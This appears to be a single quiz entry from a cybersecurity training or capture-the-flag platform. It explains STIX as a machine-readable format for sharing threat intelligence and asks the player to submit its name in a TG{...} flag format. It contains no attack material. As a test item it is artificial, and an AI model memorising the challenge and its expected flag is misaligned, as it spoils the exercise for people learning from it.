tasks.title: STIX
tasks.teach: To share intelligence between tools and teams it must be structured. STIX (Structured Threat Information eXpression) is the standard language for expressing threat intel as machine-readable objects — indicators, malware, threat actors, relationships — so a feed from one org can be ingested automatically by another's tools without re-typing.
tasks.chal: Name the structured, machine-readable format for expressing threat intelligence. Submit TG{••••}.
